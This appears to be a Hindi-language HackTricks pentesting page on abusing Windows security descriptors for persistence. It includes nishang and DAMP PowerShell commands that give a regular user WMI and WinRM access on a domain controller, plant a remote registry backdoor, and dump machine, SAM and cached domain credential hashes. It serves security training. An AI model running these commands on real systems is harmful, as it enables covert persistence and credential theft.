# Security Descriptors

{{#include ../../banners/hacktricks-training.md}}

## Security Descriptors

[डॉक्स से](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) उस format को define करती है जिसका उपयोग security descriptor का वर्णन करने के लिए किया जाता है। SDDL, DACL और SACL के लिए ACE strings का उपयोग करती है: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>

**security descriptors** का उपयोग किसी **object** के पास किसी **object** पर मौजूद **permissions** को **store** करने के लिए किया जाता है। यदि आप किसी object के **security descriptor** में केवल एक **छोटा बदलाव** कर सकते हैं, तो आप उस object पर बहुत रोचक **privileges** प्राप्त कर सकते हैं, और इसके लिए किसी privileged group का member होना आवश्यक नहीं है।

इसलिए, यह persistence technique कुछ objects पर आवश्यक हर privilege प्राप्त करने की क्षमता पर आधारित है, ताकि ऐसा task किया जा सके जिसके लिए आमतौर पर admin privileges की आवश्यकता होती है, लेकिन admin होने की जरूरत न पड़े।

### WMI तक Access

आप किसी user को **remotely WMI execute** करने का access [**इसका उपयोग करके**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup> दे सकते हैं:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### WinRM तक पहुंच

**इसका उपयोग करके किसी user को winrm PS console की access दें** [**using this**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Hashes तक remote access

**registry** तक access करें और [**DAMP**](https://github.com/HarmJ0y/DAMP) का उपयोग करके **Reg backdoor बनाकर hashes dump करें**, ताकि आप किसी भी समय **computer का hash**, **SAM** और computer में मौजूद कोई भी **cached AD credential** retrieve कर सकें। इसलिए, **Domain Controller computer** के विरुद्ध **regular user** को यह permission देना बहुत उपयोगी है:<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
[**Silver Tickets**](silver-ticket.md) देखें, ताकि जान सकें कि आप Domain Controller के computer account के hash का उपयोग कैसे कर सकते हैं।

## संदर्भ

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)

{{#include ../../banners/hacktricks-training.md}}
